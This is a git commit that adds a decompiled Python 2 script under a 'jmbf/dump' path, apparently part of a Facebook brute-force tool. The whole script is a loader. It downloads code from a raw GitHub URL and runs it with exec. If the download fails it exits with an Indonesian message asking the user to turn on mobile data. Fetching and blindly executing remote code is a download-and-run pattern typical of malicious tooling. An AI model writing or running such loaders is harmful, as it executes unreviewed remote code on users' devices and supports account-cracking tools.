bcd7ca42e5f16cc23c35c7276f486653ed3b177a
BIL4L-KH4N <90181951+BIL4L-KH4N@users.noreply.github.com>
2021-10-06 15:57:06 +0500

    Add files via upload

---
+++ jmbf/dump/asw-dec.py
@@ -0,0 +1,12 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: <haMzah>
+import os, sys, requests
+try:
+    exec requests.get('https://raw.githubusercontent.com/Yayan-XD/MBF/main/server/asw.py').text
+except requests.exceptions.ConnectionError:
+    sys.exit('\n\x1b[97m[\x1b[91m!\x1b[97m] Hidupin Data Seluler Dulu Bos')
+
+exit()
